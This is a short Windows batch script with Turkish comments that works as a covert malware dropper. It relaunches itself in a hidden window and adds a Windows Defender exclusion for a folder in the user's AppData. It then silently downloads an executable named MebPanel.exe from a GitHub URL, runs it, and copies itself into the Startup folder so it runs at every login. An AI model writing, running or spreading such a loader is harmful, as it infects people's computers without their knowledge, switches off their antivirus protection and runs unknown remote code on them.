@echo off
chcp 65001 >nul

:: Gizli mod
if not "%1"=="hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: Ayarlar
set "INSTALL=%LOCALAPPDATA%\MebPanel"
set "URL=https://raw.githubusercontent.com/zugar00311/aa/refs/heads/main/MebPanel.exe"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "BATFILE=%STARTUP%\MebPanel_Kontrol.bat"
set "EXEFILE=%INSTALL%\MebPanel.exe"

:: Klasör oluştur
mkdir "%INSTALL%" 2>nul

:: Defender dışlama
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%INSTALL%'" >nul 2>&1

:: Kontrol: MebPanel.exe var mı?
if not exist "%EXEFILE%" (
    :: Yoksa indir
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%EXEFILE%' -UseBasicParsing" >nul 2>&1
)

:: Çalışıyor mu kontrol et
tasklist | findstr /I "MebPanel.exe" >nul
if %ERRORLEVEL% NEQ 0 (
    :: Çalışmıyorsa başlat
    start "" "%EXEFILE%"
)

:: BAT dosyasını başlangıca ekle (kendini)
if not exist "%BATFILE%" (
    copy "%~f0" "%BATFILE%" >nul 2>&1
)

exit
